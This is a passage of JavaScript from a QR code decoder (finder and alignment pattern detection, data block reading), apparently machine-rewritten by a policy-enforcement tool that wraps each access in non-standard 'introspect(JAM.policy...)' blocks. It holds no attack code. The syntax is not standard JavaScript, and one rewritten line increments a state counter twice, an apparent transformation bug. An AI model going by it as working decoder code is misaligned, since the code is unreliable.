  function v97(startI, centerJ, maxCount, originalStateCountTotal) {
    var image$$8 = this.image;
    var maxI = qrcode.height;
    var stateCount$$2 = this.CrossCheckStateCount;
    var i$$49 = startI;
    var v1709 = i$$49 >= 0;
    if (v1709) {
      var v2410 = centerJ + i$$49 * qrcode.width;
      introspect(JAM.policy.p26) {
        v1709 = image$$8[v2410];
      }
    }
    var v877 = v1709;
    for (;v877;) {
      introspect(JAM.policy.p26) {
        var v1710 = stateCount$$2[2]
      }
      introspect(JAM.policy.p27) {
        stateCount$$2[2] = v1710 + 1;
      }
      i$$49 = i$$49 - 1;
      var v1711 = i$$49 >= 0;
      if (v1711) {
        var v2411 = centerJ + i$$49 * qrcode.width;
        introspect(JAM.policy.p26) {
          v1711 = image$$8[v2411];
        }
      }
      v877 = v1711;
    }
    if (i$$49 < 0) {
      return NaN;
    }
    var v2412 = i$$49 >= 0;
    if (v2412) {
      var v2727 = centerJ + i$$49 * qrcode.width;
      introspect(JAM.policy.p26) {
        var v2629 = image$$8[v2727]
      }
      v2412 = !v2629;
    }
    var v1712 = v2412;
    if (v1712) {
      introspect(JAM.policy.p26) {
        var v2413 = stateCount$$2[1]
      }
      v1712 = v2413 <= maxCount;
    }
    var v879 = v1712;
    for (;v879;) {
      introspect(JAM.policy.p26) {
        var v1713 = stateCount$$2[1]
      }
      introspect(JAM.policy.p27) {
        stateCount$$2[1] = v1713 + 1;
      }
      i$$49 = i$$49 - 1;
      var v2414 = i$$49 >= 0;
      if (v2414) {
        var v2728 = centerJ + i$$49 * qrcode.width;
        introspect(JAM.policy.p26) {
          var v2630 = image$$8[v2728]
        }
        v2414 = !v2630;
      }
      var v1714 = v2414;
      if (v1714) {
        introspect(JAM.policy.p26) {
          var v2415 = stateCount$$2[1]
        }
        v1714 = v2415 <= maxCount;
      }
      v879 = v1714;
    }
    var v1715 = i$$49 < 0;
    if (!v1715) {
      introspect(JAM.policy.p26) {
        var v2416 = stateCount$$2[1]
      }
      v1715 = v2416 > maxCount;
    }
    if (v1715) {
      return NaN;
    }
    var v2418 = i$$49 >= 0;
    if (v2418) {
      var v2631 = centerJ + i$$49 * qrcode.width;
      introspect(JAM.policy.p26) {
        v2418 = image$$8[v2631];
      }
    }
    var v1716 = v2418;
    if (v1716) {
      introspect(JAM.policy.p26) {
        var v2419 = stateCount$$2[0]
      }
      v1716 = v2419 <= maxCount;
    }
    var v881 = v1716;
    for (;v881;) {
      introspect(JAM.policy.p26) {
        var v1717 = stateCount$$2[0]
      }
      introspect(JAM.policy.p27) {
        stateCount$$2[0] = v1717 + 1;
      }
      i$$49 = i$$49 - 1;
      var v2420 = i$$49 >= 0;
      if (v2420) {
        var v2632 = centerJ + i$$49 * qrcode.width;
        introspect(JAM.policy.p26) {
          v2420 = image$$8[v2632];
        }
      }
      var v1718 = v2420;
      if (v1718) {
        introspect(JAM.policy.p26) {
          var v2421 = stateCount$$2[0]
        }
        v1718 = v2421 <= maxCount;
      }
      v881 = v1718;
    }
    introspect(JAM.policy.p26) {
      var v1719 = stateCount$$2[0]
    }
    if (v1719 > maxCount) {
      return NaN;
    }
    i$$49 = startI + 1;
    var v1720 = i$$49 < maxI;
    if (v1720) {
      var v2422 = centerJ + i$$49 * qrcode.width;
      introspect(JAM.policy.p26) {
        v1720 = image$$8[v2422];
      }
    }
    var v883 = v1720;
    for (;v883;) {
      introspect(JAM.policy.p26) {
        var v1721 = stateCount$$2[2]
      }
      introspect(JAM.policy.p27) {
        stateCount$$2[2] = v1721 + 1;
      }
      i$$49 = i$$49 + 1;
      var v1722 = i$$49 < maxI;
      if (v1722) {
        var v2423 = centerJ + i$$49 * qrcode.width;
        introspect(JAM.policy.p26) {
          v1722 = image$$8[v2423];
        }
      }
      v883 = v1722;
    }
    if (i$$49 === maxI) {
      return NaN;
    }
    var v2424 = i$$49 < maxI;
    if (v2424) {
      var v2733 = centerJ + i$$49 * qrcode.width;
      introspect(JAM.policy.p26) {
        var v2635 = image$$8[v2733]
      }
      v2424 = !v2635;
    }
    var v1723 = v2424;
    if (v1723) {
      introspect(JAM.policy.p26) {
        var v2425 = stateCount$$2[3]
      }
      v1723 = v2425 < maxCount;
    }
    var v885 = v1723;
    for (;v885;) {
      introspect(JAM.policy.p26) {
        var v1724 = stateCount$$2[3]
      }
      introspect(JAM.policy.p27) {
        stateCount$$2[3] = v1724 + 1;
      }
      i$$49 = i$$49 + 1;
      var v2426 = i$$49 < maxI;
      if (v2426) {
        var v2734 = centerJ + i$$49 * qrcode.width;
        introspect(JAM.policy.p26) {
          var v2636 = image$$8[v2734]
        }
        v2426 = !v2636;
      }
      var v1725 = v2426;
      if (v1725) {
        introspect(JAM.policy.p26) {
          var v2427 = stateCount$$2[3]
        }
        v1725 = v2427 < maxCount;
      }
      v885 = v1725;
    }
    var v1726 = i$$49 === maxI;
    if (!v1726) {
      introspect(JAM.policy.p26) {
        var v2428 = stateCount$$2[3]
      }
      v1726 = v2428 >= maxCount;
    }
    if (v1726) {
      return NaN;
    }
    var v2430 = i$$49 < maxI;
    if (v2430) {
      var v2637 = centerJ + i$$49 * qrcode.width;
      introspect(JAM.policy.p26) {
        v2430 = image$$8[v2637];
      }
    }
    var v1727 = v2430;
    if (v1727) {
      introspect(JAM.policy.p26) {
        var v2431 = stateCount$$2[4]
      }
      v1727 = v2431 < maxCount;
    }
    var v887 = v1727;
    for (;v887;) {
      introspect(JAM.policy.p26) {
        var v1728 = stateCount$$2[4]
      }
      introspect(JAM.policy.p27) {
        stateCount$$2[4] = v1728 + 1;
      }
      i$$49 = i$$49 + 1;
      var v2432 = i$$49 < maxI;
      if (v2432) {
        var v2638 = centerJ + i$$49 * qrcode.width;
        introspect(JAM.policy.p26) {
          v2432 = image$$8[v2638];
        }
      }
      var v1729 = v2432;
      if (v1729) {
        introspect(JAM.policy.p26) {
          var v2433 = stateCount$$2[4]
        }
        v1729 = v2433 < maxCount;
      }
      v887 = v1729;
    }
    introspect(JAM.policy.p26) {
      var v1730 = stateCount$$2[4]
    }
    if (v1730 >= maxCount) {
      return NaN;
    }
    introspect(JAM.policy.p26) {
      var v2639 = stateCount$$2[0]
    }
    introspect(JAM.policy.p26) {
      var v2640 = stateCount$$2[1]
    }
    var v2434 = v2639 + v2640;
    introspect(JAM.policy.p26) {
      var v2435 = stateCount$$2[2]
    }
    var v1731 = v2434 + v2435;
    introspect(JAM.policy.p26) {
      var v1732 = stateCount$$2[3]
    }
    var v889 = v1731 + v1732;
    introspect(JAM.policy.p26) {
      var v890 = stateCount$$2[4]
    }
    var stateCountTotal = v889 + v890;
    if (5 * JAM.call(Math.abs, Math, [stateCountTotal - originalStateCountTotal], JAM.policy.p39) >= 2 * originalStateCountTotal) {
      return NaN;
    }
    var v892;
    if (JAM.call(this.foundPatternCross, this, [stateCount$$2], JAM.policy.p39)) {
      v892 = JAM.call(this.centerFromEnd, this, [stateCount$$2, i$$49], JAM.policy.p38);
    } else {
      v892 = NaN;
    }
    return v892;
  }
  function v96(stateCount$$1, end$$2) {
    introspect(JAM.policy.p26) {
      var v2437 = stateCount$$1[4]
    }
    var v1736 = end$$2 - v2437;
    introspect(JAM.policy.p26) {
      var v1737 = stateCount$$1[3]
    }
    var v893 = v1736 - v1737;
    introspect(JAM.policy.p26) {
      var v1738 = stateCount$$1[2]
    }
    return v893 - v1738 / 2;
  }
  function v95(stateCount) {
    var totalModuleSize = 0;
    var i$$48 = 0;
    var v896 = i$$48 < 5;
    for (;v896;) {
      introspect(JAM.policy.p26) {
        var count$$5 = stateCount[i$$48]
      }
      if (count$$5 === 0) {
        return false;
      }
      totalModuleSize = totalModuleSize + count$$5;
      i$$48 = i$$48 + 1;
      v896 = i$$48 < 5;
    }
    if (totalModuleSize < 7) {
      return false;
    }
    var moduleSize$$3 = JAM.call(Math.floor, Math, [(totalModuleSize << INTEGER_MATH_SHIFT) / 7], JAM.policy.p39);
    var maxVariance = JAM.call(Math.floor, Math, [moduleSize$$3 / 2], JAM.policy.p39);
    introspect(JAM.policy.p26) {
      var v2838 = stateCount[0]
    }
    var v2642 = JAM.call(Math.abs, Math, [moduleSize$$3 - (v2838 << INTEGER_MATH_SHIFT)], JAM.policy.p39) < maxVariance;
    if (v2642) {
      introspect(JAM.policy.p26) {
        var v2839 = stateCount[1]
      }
      v2642 = JAM.call(Math.abs, Math, [moduleSize$$3 - (v2839 << INTEGER_MATH_SHIFT)], JAM.policy.p39) < maxVariance;
    }
    var v2438 = v2642;
    if (v2438) {
      var v2795 = 3 * moduleSize$$3;
      introspect(JAM.policy.p26) {
        var v2828 = stateCount[2]
      }
      v2438 = JAM.call(Math.abs, Math, [v2795 - (v2828 << INTEGER_MATH_SHIFT)], JAM.policy.p39) < 3 * maxVariance;
    }
    var v1740 = v2438;
    if (v1740) {
      introspect(JAM.policy.p26) {
        var v2797 = stateCount[3]
      }
      v1740 = JAM.call(Math.abs, Math, [moduleSize$$3 - (v2797 << INTEGER_MATH_SHIFT)], JAM.policy.p39) < maxVariance;
    }
    var v900 = v1740;
    if (v900) {
      introspect(JAM.policy.p26) {
        var v2741 = stateCount[4]
      }
      v900 = JAM.call(Math.abs, Math, [moduleSize$$3 - (v2741 << INTEGER_MATH_SHIFT)], JAM.policy.p39) < maxVariance;
    }
    return v900;
  }
  function v94() {
    var v901 = this.crossCheckStateCount;
    introspect(JAM.policy.p27) {
      v901[0] = 0;
    }
    var v902 = this.crossCheckStateCount;
    introspect(JAM.policy.p27) {
      v902[1] = 0;
    }
    var v903 = this.crossCheckStateCount;
    introspect(JAM.policy.p27) {
      v903[2] = 0;
    }
    var v904 = this.crossCheckStateCount;
    introspect(JAM.policy.p27) {
      v904[3] = 0;
    }
    var v905 = this.crossCheckStateCount;
    introspect(JAM.policy.p27) {
      v905[4] = 0;
    }
    return this.crossCheckStateCount;
  }
  this.image = null;
  this.possibleCenters = [];
  this.hasSkipped = false;
  var v2872 = JAM.new(Array, [0, 0, 0, 0, 0], JAM.policy.p22);
  this.crossCheckStateCount = v2872;
  this.resultPointCallback = null;
  JAM.call(this.__defineGetter__, this, ["CrossCheckStateCount", v94], JAM.policy.p23);
  this.foundPatternCross = v95;
  this.centerFromEnd = v96;
  this.crossCheckVertical = v97;
  this.crossCheckHorizontal = v98;
  this.handlePossibleCenter = v99;
  this.selectBestPatterns = v102;
  this.findRowSkip = v103;
  this.haveMultiplyConfirmedCenters = v104;
  this.findFinderPattern = v105;
  return;
}
function AlignmentPattern(posX$$1, posY$$1, estimatedModuleSize$$2) {
  function v111(moduleSize$$4, i$$55, j$$29) {
    var v1742 = JAM.call(Math.abs, Math, [i$$55 - this.y], JAM.policy.p39) <= moduleSize$$4;
    if (v1742) {
      v1742 = JAM.call(Math.abs, Math, [j$$29 - this.x], JAM.policy.p39) <= moduleSize$$4;
    }
    if (v1742) {
      var moduleSizeDiff$$1 = JAM.call(Math.abs, Math, [moduleSize$$4 - this.estimatedModuleSize], JAM.policy.p39);
      var v907 = moduleSizeDiff$$1 <= 1;
      if (!v907) {
        v907 = moduleSizeDiff$$1 / this.estimatedModuleSize <= 1;
      }
      return v907;
    }
    return false;
  }
  function v110() {
    this.count = this.count + 1;
    return;
  }
  function v109() {
    return JAM.call(Math.floor, Math, [this.y], JAM.policy.p39);
  }
  function v108() {
    return JAM.call(Math.floor, Math, [this.x], JAM.policy.p39);
  }
  function v107() {
    return this.count;
  }
  function v106() {
    return this.estimatedModuleSize;
  }
  this.x = posX$$1;
  this.y = posY$$1;
  this.count = 1;
  this.estimatedModuleSize = estimatedModuleSize$$2;
  JAM.call(this.__defineGetter__, this, ["EstimatedModuleSize", v106], JAM.policy.p23);
  JAM.call(this.__defineGetter__, this, ["Count", v107], JAM.policy.p23);
  JAM.call(this.__defineGetter__, this, ["X", v108], JAM.policy.p23);
  JAM.call(this.__defineGetter__, this, ["Y", v109], JAM.policy.p23);
  this.incrementCount = v110;
  this.aboutEquals = v111;
  return;
}
function AlignmentPatternFinder(image$$11, startX, startY, width$$12, height$$11, moduleSize$$5, resultPointCallback) {
  function v116() {
    var startX$$1 = this.startX;
    var height$$12 = this.height;
    var maxJ$$2 = startX$$1 + width$$12;
    var middleI = startY + (height$$12 >> 1);
    var stateCount$$10 = JAM.new(Array, [0, 0, 0], JAM.policy.p22);
    var iGen = 0;
    var v923 = iGen < height$$12;
    for (;v923;) {
      var v1747;
      if ((iGen & 1) === 0) {
        v1747 = iGen + 1 >> 1;
      } else {
        v1747 = -(iGen + 1 >> 1);
      }
      var i$$59 = middleI + v1747;
      introspect(JAM.policy.p27) {
        stateCount$$10[0] = 0;
      }
      introspect(JAM.policy.p27) {
        stateCount$$10[1] = 0;
      }
      introspect(JAM.policy.p27) {
        stateCount$$10[2] = 0;
      }
      var j$$31 = startX$$1;
      var v1748 = j$$31 < maxJ$$2;
      if (v1748) {
        var v2651 = j$$31 + qrcode.width * i$$59;
        introspect(JAM.policy.p26) {
          var v2447 = image$$11[v2651]
        }
        v1748 = !v2447;
      }
      var v913 = v1748;
      for (;v913;) {
        j$$31 = j$$31 + 1;
        var v1749 = j$$31 < maxJ$$2;
        if (v1749) {
          var v2652 = j$$31 + qrcode.width * i$$59;
          introspect(JAM.policy.p26) {
            var v2448 = image$$11[v2652]
          }
          v1749 = !v2448;
        }
        v913 = v1749;
      }
      var currentState$$1 = 0;
      var v920 = j$$31 < maxJ$$2;
      for (;v920;) {
        var v1750 = j$$31 + i$$59 * qrcode.width;
        introspect(JAM.policy.p26) {
          var v919 = image$$11[v1750]
        }
        if (v919) {
          if (currentState$$1 === 1) {
            introspect(JAM.policy.p26) {
              var v1751 = stateCount$$10[currentState$$1]
            }
            introspect(JAM.policy.p27) {
              stateCount$$10[currentState$$1] = v1751 + 1;
            }
          } else {
            if (currentState$$1 === 2) {
              if (JAM.call(this.foundPatternCross, this, [stateCount$$10], JAM.policy.p39)) {
                var confirmed$$1 = JAM.call(this.handlePossibleCenter, this, [stateCount$$10, i$$59, j$$31], JAM.policy.p38);
                if (confirmed$$1 !== null) {
                  return confirmed$$1;
                }
              }
              introspect(JAM.policy.p27) {
                stateCount$$10[0] = stateCount$$10[2];
              }
              introspect(JAM.policy.p27) {
                stateCount$$10[1] = 1;
              }
              introspect(JAM.policy.p27) {
                stateCount$$10[2] = 0;
              }
              currentState$$1 = 1;
            } else {
              var v1752 = currentState$$1 = currentState$$1 + 1;
              var v2654 = currentState$$1 = currentState$$1 + 1;
              introspect(JAM.policy.p26) {
                var v2450 = stateCount$$10[v2654]
              }
              introspect(JAM.policy.p27) {
                stateCount$$10[v1752] = v2450 + 1;
              }
            }
          }
        } else {
          if (currentState$$1 === 1) {
            currentState$$1 = currentState$$1 + 1;
          }
          introspect(JAM.policy.p26) {
            var v1753 = stateCount$$10[currentState$$1]
          }
          introspect(JAM.policy.p27) {
            stateCount$$10[currentState$$1] = v1753 + 1;
          }
        }
        j$$31 = j$$31 + 1;
        v920 = j$$31 < maxJ$$2;
      }
      if (JAM.call(this.foundPatternCross, this, [stateCount$$10], JAM.policy.p39)) {
        confirmed$$1 = JAM.call(this.handlePossibleCenter, this, [stateCount$$10, i$$59, maxJ$$2], JAM.policy.p38);
        if (confirmed$$1 !== null) {
          return confirmed$$1;
        }
      }
      iGen = iGen + 1;
      v923 = iGen < height$$12;
    }
    if (!(this.possibleCenters.length === 0)) {
      var v924 = this.possibleCenters;
      introspect(JAM.policy.p26) {
        return v924[0];
      }
    }
    throw "Couldn't find enough alignment patterns";
  }
  function v115(stateCount$$9, i$$58, j$$30) {
    introspect(JAM.policy.p26) {
      var v1755 = stateCount$$9[0]
    }
    introspect(JAM.policy.p26) {
      var v1756 = stateCount$$9[1]
    }
    var v926 = v1755 + v1756;
    introspect(JAM.policy.p26) {
      var v927 = stateCount$$9[2]
    }
    var stateCountTotal$$4 = v926 + v927;
    var centerJ$$3 = JAM.call(this.centerFromEnd, this, [stateCount$$9, j$$30], JAM.policy.p38);
    var v928 = JAM.call(Math.floor, Math, [centerJ$$3], JAM.policy.p39);
    introspect(JAM.policy.p26) {
      var v1757 = stateCount$$9[1]
    }
    var centerI$$2 = JAM.call(this.crossCheckVertical, this, [i$$58, v928, 2 * v1757, stateCountTotal$$4], JAM.policy.p38);
    if (!JAM.call(isNaN, null, [centerI$$2], JAM.policy.p39)) {
      introspect(JAM.policy.p26) {
        var v2452 = stateCount$$9[0]
      }
      introspect(JAM.policy.p26) {
        var v2453 = stateCount$$9[1]
      }
      var v1759 = v2452 + v2453;
      introspect(JAM.policy.p26) {
        var v1760 = stateCount$$9[2]
      }
      var estimatedModuleSize$$3 = (v1759 + v1760) / 3;
      var max$$8 = this.possibleCenters.length;
      var index$$40 = 0;
      var v934 = index$$40 < max$$8;
      for (;v934;) {
        var v932 = this.possibleCenters;
        introspect(JAM.policy.p26) {
          var center$$2 = v932[index$$40]
        }
        if (JAM.call(center$$2.aboutEquals, center$$2, [estimatedModuleSize$$3, centerI$$2, centerJ$$3], JAM.policy.p38)) {
          return JAM.new(AlignmentPattern, [centerJ$$3, centerI$$2, estimatedModuleSize$$3], JAM.policy.p38);
        }
        index$$40 = index$$40 + 1;
        v934 = index$$40 < max$$8;
      }
      var point$$3 = JAM.new(AlignmentPattern, [centerJ$$3, centerI$$2, estimatedModuleSize$$3], JAM.policy.p38);
      var v935 = this.possibleCenters;
      JAM.call(v935.push, v935, [point$$3], JAM.policy.p39);
      if (this.resultPointCallback !== null) {
        var v936 = this.resultPointCallback;
        JAM.call(v936.foundPossibleResultPoint, v936, [point$$3], JAM.policy.p39);
      }
    }
    return null;
  }
  function v114(startI$$1, centerJ$$2, maxCount$$2, originalStateCountTotal$$2) {
    var image$$12 = this.image;
    var maxI$$2 = qrcode.height;
    var stateCount$$8 = this.crossCheckStateCount;
    introspect(JAM.policy.p27) {
      stateCount$$8[0] = 0;
    }
    introspect(JAM.policy.p27) {
      stateCount$$8[1] = 0;
    }
    introspect(JAM.policy.p27) {
      stateCount$$8[2] = 0;
    }
    var i$$57 = startI$$1;
    var v2454 = i$$57 >= 0;
    if (v2454) {
      var v2656 = centerJ$$2 + i$$57 * qrcode.width;
      introspect(JAM.policy.p26) {
        v2454 = image$$12[v2656];
      }
    }
    var v1762 = v2454;
    if (v1762) {
      introspect(JAM.policy.p26) {
        var v2455 = stateCount$$8[1]
      }
      v1762 = v2455 <= maxCount$$2;
    }
    var v939 = v1762;
    for (;v939;) {
      introspect(JAM.policy.p26) {
        var v1763 = stateCount$$8[1]
      }
      introspect(JAM.policy.p27) {
        stateCount$$8[1] = v1763 + 1;
      }
      i$$57 = i$$57 - 1;
      var v2456 = i$$57 >= 0;
      if (v2456) {
        var v2657 = centerJ$$2 + i$$57 * qrcode.width;
        introspect(JAM.policy.p26) {
          v2456 = image$$12[v2657];
        }
      }
      var v1764 = v2456;
      if (v1764) {
        introspect(JAM.policy.p26) {
          var v2457 = stateCount$$8[1]
        }
        v1764 = v2457 <= maxCount$$2;
      }
      v939 = v1764;
    }
    var v1765 = i$$57 < 0;
    if (!v1765) {
      introspect(JAM.policy.p26) {
        var v2458 = stateCount$$8[1]
      }
      v1765 = v2458 > maxCount$$2;
    }
    if (v1765) {
      return NaN;
    }
    var v2460 = i$$57 >= 0;
    if (v2460) {
      var v2748 = centerJ$$2 + i$$57 * qrcode.width;
      introspect(JAM.policy.p26) {
        var v2658 = image$$12[v2748]
      }
      v2460 = !v2658;
    }
    var v1766 = v2460;
    if (v1766) {
      introspect(JAM.policy.p26) {
        var v2461 = stateCount$$8[0]
      }
      v1766 = v2461 <= maxCount$$2;
    }
    var v941 = v1766;
    for (;v941;) {
      introspect(JAM.policy.p26) {
        var v1767 = stateCount$$8[0]
      }
      introspect(JAM.policy.p27) {
        stateCount$$8[0] = v1767 + 1;
      }
      i$$57 = i$$57 - 1;
      var v2462 = i$$57 >= 0;
      if (v2462) {
        var v2749 = centerJ$$2 + i$$57 * qrcode.width;
        introspect(JAM.policy.p26) {
          var v2659 = image$$12[v2749]
        }
        v2462 = !v2659;
      }
      var v1768 = v2462;
      if (v1768) {
        introspect(JAM.policy.p26) {
          var v2463 = stateCount$$8[0]
        }
        v1768 = v2463 <= maxCount$$2;
      }
      v941 = v1768;
    }
    introspect(JAM.policy.p26) {
      var v1769 = stateCount$$8[0]
    }
    if (v1769 > maxCount$$2) {
      return NaN;
    }
    i$$57 = startI$$1 + 1;
    var v2464 = i$$57 < maxI$$2;
    if (v2464) {
      var v2660 = centerJ$$2 + i$$57 * qrcode.width;
      introspect(JAM.policy.p26) {
        v2464 = image$$12[v2660];
      }
    }
    var v1770 = v2464;
    if (v1770) {
      introspect(JAM.policy.p26) {
        var v2465 = stateCount$$8[1]
      }
      v1770 = v2465 <= maxCount$$2;
    }
    var v943 = v1770;
    for (;v943;) {
      introspect(JAM.policy.p26) {
        var v1771 = stateCount$$8[1]
      }
      introspect(JAM.policy.p27) {
        stateCount$$8[1] = v1771 + 1;
      }
      i$$57 = i$$57 + 1;
      var v2466 = i$$57 < maxI$$2;
      if (v2466) {
        var v2661 = centerJ$$2 + i$$57 * qrcode.width;
        introspect(JAM.policy.p26) {
          v2466 = image$$12[v2661];
        }
      }
      var v1772 = v2466;
      if (v1772) {
        introspect(JAM.policy.p26) {
          var v2467 = stateCount$$8[1]
        }
        v1772 = v2467 <= maxCount$$2;
      }
      v943 = v1772;
    }
    var v1773 = i$$57 === maxI$$2;
    if (!v1773) {
      introspect(JAM.policy.p26) {
        var v2468 = stateCount$$8[1]
      }
      v1773 = v2468 > maxCount$$2;
    }
    if (v1773) {
      return NaN;
    }
    var v2470 = i$$57 < maxI$$2;
    if (v2470) {
      var v2752 = centerJ$$2 + i$$57 * qrcode.width;
      introspect(JAM.policy.p26) {
        var v2662 = image$$12[v2752]
      }
      v2470 = !v2662;
    }
    var v1774 = v2470;
    if (v1774) {
      introspect(JAM.policy.p26) {
        var v2471 = stateCount$$8[2]
      }
      v1774 = v2471 <= maxCount$$2;
    }
    var v945 = v1774;
    for (;v945;) {
      introspect(JAM.policy.p26) {
        var v1775 = stateCount$$8[2]
      }
      introspect(JAM.policy.p27) {
        stateCount$$8[2] = v1775 + 1;
      }
      i$$57 = i$$57 + 1;
      var v2472 = i$$57 < maxI$$2;
      if (v2472) {
        var v2753 = centerJ$$2 + i$$57 * qrcode.width;
        introspect(JAM.policy.p26) {
          var v2663 = image$$12[v2753]
        }
        v2472 = !v2663;
      }
      var v1776 = v2472;
      if (v1776) {
        introspect(JAM.policy.p26) {
          var v2473 = stateCount$$8[2]
        }
        v1776 = v2473 <= maxCount$$2;
      }
      v945 = v1776;
    }
    introspect(JAM.policy.p26) {
      var v1777 = stateCount$$8[2]
    }
    if (v1777 > maxCount$$2) {
      return NaN;
    }
    introspect(JAM.policy.p26) {
      var v1778 = stateCount$$8[0]
    }
    introspect(JAM.policy.p26) {
      var v1779 = stateCount$$8[1]
    }
    var v947 = v1778 + v1779;
    introspect(JAM.policy.p26) {
      var v948 = stateCount$$8[2]
    }
    var stateCountTotal$$3 = v947 + v948;
    if (5 * JAM.call(Math.abs, Math, [stateCountTotal$$3 - originalStateCountTotal$$2], JAM.policy.p39) >= 2 * originalStateCountTotal$$2) {
      return NaN;
    }
    var v950;
    if (JAM.call(this.foundPatternCross, this, [stateCount$$8], JAM.policy.p39)) {
      v950 = JAM.call(this.centerFromEnd, this, [stateCount$$8, i$$57], JAM.policy.p38);
    } else {
      v950 = NaN;
    }
    return v950;
  }
  function v113(stateCount$$7) {
    var moduleSize$$6 = this.moduleSize;
    var maxVariance$$1 = moduleSize$$6 / 2;
    var i$$56 = 0;
    var v952 = i$$56 < 3;
    for (;v952;) {
      introspect(JAM.policy.p26) {
        var v2665 = stateCount$$7[i$$56]
      }
      if (JAM.call(Math.abs, Math, [moduleSize$$6 - v2665], JAM.policy.p39) >= maxVariance$$1) {
        return false;
      }
      i$$56 = i$$56 + 1;
      v952 = i$$56 < 3;
    }
    return true;
  }
  function v112(stateCount$$6, end$$3) {
    introspect(JAM.policy.p26) {
      var v1784 = stateCount$$6[2]
    }
    var v953 = end$$3 - v1784;
    introspect(JAM.policy.p26) {
      var v1785 = stateCount$$6[1]
    }
    return v953 - v1785 / 2;
  }
  this.image = image$$11;
  var v2873 = JAM.new(Array, [], JAM.policy.p40);
  this.possibleCenters = v2873;
  this.startX = startX;
  this.startY = startY;
  this.width = width$$12;
  this.height = height$$11;
  this.moduleSize = moduleSize$$5;
  var v2874 = JAM.new(Array, [0, 0, 0], JAM.policy.p22);
  this.crossCheckStateCount = v2874;
  this.resultPointCallback = resultPointCallback;
  this.centerFromEnd = v112;
  this.foundPatternCross = v113;
  this.crossCheckVertical = v114;
  this.handlePossibleCenter = v115;
  this.find = v116;
  return;
}
function QRCodeDataBlockReader(blocks, version$$8, numErrorCorrectionCode) {
  function v124() {
    var output$$1 = JAM.new(Array, [], JAM.policy.p40);
    var MODE_NUMBER = 1;
    var MODE_ROMAN_AND_NUMBER = 2;
    var MODE_8BIT_BYTE = 4;
    var MODE_KANJI = 8;
    do {
      var mode$$7 = JAM.call(this.NextMode, this, [], JAM.policy.p40);
      if (mode$$7 === 0) {
        if (output$$1.length > 0) {
          break;
        } else {
          throw "Empty data block";
        }
      }
      var v2666 = mode$$7 !== MODE_NUMBER;
      if (v2666) {
        v2666 = mode$$7 !== MODE_ROMAN_AND_NUMBER;
      }
      var v2476 = v2666;
      if (v2476) {
        v2476 = mode$$7 !== MODE_8BIT_BYTE;
      }
      var v1787 = v2476;
      if (v1787) {
        v1787 = mode$$7 !== MODE_KANJI;
      }
      if (v1787) {
        throw "Invalid mode: " + mode$$7 + " in (block:" + this.blockPointer + " bit:" + this.bitPointer + ")";
      }
      dataLength = JAM.call(this.getDataLength, this, [mode$$7], JAM.policy.p39);
      if (dataLength < 1) {
        throw "Invalid data length: " + dataLength;
      }
      introspect(JAM.policy.p26) {
        switch(mode$$7) {
          case MODE_NUMBER:
            var temp_str = JAM.call(this.getFigureString, this, [dataLength], JAM.policy.p39);
            var v960 = temp_str.length;
            var ta = JAM.new(Array, [v960], JAM.policy.p39);
            var j$$32 = 0;
            var v1790 = temp_str.length;
            var v963 = j$$32 < v1790;
            for (;v963;) {
              var v961 = ta;
              var v962 = j$$32;
              var v2875 = JAM.call(temp_str.charCodeAt, temp_str, [j$$32], JAM.policy.p39);
              introspect(JAM.policy.p27) {
                v961[v962] = v2875;
              }
              j$$32 = j$$32 + 1;
              var v1791 = temp_str.length;
              v963 = j$$32 < v1791;
            }
            JAM.call(output$$1.push, output$$1, [ta], JAM.policy.p39);
            break;
          case MODE_ROMAN_AND_NUMBER:
            temp_str = JAM.call(this.getRomanAndFigureString, this, [dataLength], JAM.policy.p39);
            var v964 = temp_str.length;
            ta = JAM.new(Array, [v964], JAM.policy.p39);
            j$$32 = 0;
            var v1792 = temp_str.length;
            var v967 = j$$32 < v1792;
            for (;v967;) {
              var v965 = ta;
              var v966 = j$$32;
              var v2876 = JAM.call(temp_str.charCodeAt, temp_str, [j$$32], JAM.policy.p39);
              introspect(JAM.policy.p27) {
                v965[v966] = v2876;
              }
              j$$32 = j$$32 + 1;
              var v1793 = temp_str.length;
              v967 = j$$32 < v1793;
            }
            JAM.call(output$$1.push, output$$1, [ta], JAM.policy.p39);
            break;
          case MODE_8BIT_BYTE:
            var temp_sbyteArray3 = JAM.call(this.get8bitByteArray, this, [dataLength], JAM.policy.p39);
            JAM.call(output$$1.push, output$$1, [temp_sbyteArray3], JAM.policy.p39);
            break;
          case MODE_KANJI:
            temp_str = JAM.call(this.getKanjiString, this, [dataLength], JAM.policy.p39);
            JAM.call(output$$1.push, output$$1, [temp_str], JAM.policy.p39);
        }
      }
    } while (true);
    return output$$1;
  }
  function v123(dataLength$$4) {
    var length$$14 = dataLength$$4;
    var intData$$3 = 0;
    var unicodeString = "";
    var v970 = length$$14 > 0;
    do {
      intData$$3 = JAM.call(getNextBits, null, [13], JAM.policy.p25);
      var lowerByte = intData$$3 % 192;
      var higherByte = intData$$3 / 192;
      var tempWord = (higherByte << 8) + lowerByte;
      var shiftjisWord = 0;
      if (tempWord + 33088 <= 40956) {
        shiftjisWord = tempWord + 33088;
      } else {
        shiftjisWord = tempWord + 49472;
      }
      unicodeString = unicodeString + JAM.call(String.fromCharCode, String, [shiftjisWord], JAM.policy.p39);
      length$$14 = length$$14 - 1;
      v970 = length$$14 > 0;
    } while (v970);
    return unicodeString;
  }
  function v122(dataLength$$3) {
    var length$$13 = dataLength$$3;
    var intData$$2 = 0;
    var output = JAM.new(Array, [], JAM.policy.p40);
    var v971 = length$$13 > 0;
    do {
      intData$$2 = JAM.call(this.getNextBits, this, [8], JAM.policy.p25);
      JAM.call(output.push, output, [intData$$2], JAM.policy.p39);
      length$$13 = length$$13 - 1;
      v971 = length$$13 > 0;
    } while (v971);
    return output;
  }
  function v121(dataLength$$2) {
    var length$$12 = dataLength$$2;
    var intData$$1 = 0;
    var strData$$1 = "";
    var v978 = length$$12 > 0;
    do {
      if (length$$12 >= 3) {
        intData$$1 = JAM.call(this.getNextBits, this, [10], JAM.policy.p25);
        if (intData$$1 < 100) {
          strData$$1 = strData$$1 + "0";
        }
        if (intData$$1 < 10) {
          strData$$1 = strData$$1 + "0";
        }
        length$$12 = length$$12 - 3;
      } else {
        if (length$$12 === 2) {
          intData$$1 = JAM.call(this.getNextBits, this, [7], JAM.policy.p25);
          if (intData$$1 < 10) {
            strData$$1 = strData$$1 + "0";
          }
          length$$12 = length$$12 - 2;
        } else {
          if (length$$12 === 1) {
            intData$$1 = JAM.call(this.getNextBits, this, [4], JAM.policy.p25);
            length$$12 = length$$12 - 1;
          }
        }
      }
      strData$$1 = strData$$1 + intData$$1;
